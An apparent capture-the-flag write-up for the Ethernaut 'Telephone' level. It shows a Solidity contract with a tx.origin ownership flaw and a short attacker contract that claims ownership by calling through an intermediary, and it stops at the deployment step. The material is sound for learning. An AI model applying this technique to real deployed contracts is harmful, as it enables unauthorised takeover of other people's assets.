# Task

Claim ownership of the contract below to complete this level.

# Contract

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```

Lets get the contract address and contract abi

![image](https://github.com/user-attachments/assets/c1fe8f04-847f-4879-8277-ad1196e20e8d)

First, lets check the owner of this contract

![image](https://github.com/user-attachments/assets/bf95721a-fc87-400a-9d1a-ed3cce80fe07)

That's the current owner of the contract

Since ownership can be transferred if `tx.origin != msg.sender` we can call the `changeOwner` function and pass in our address

Below is the solve contract

```sol
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import "./telephone.sol";

contract TelephoneHack {
    Telephone telecontract;

    constructor(address _address) {
        telecontract = Telephone(_address);
    }

    function hackContract(address _address) public{ 
        telecontract.changeOwner(_address);
    }
    
}
```
Lets deploy this using forge













































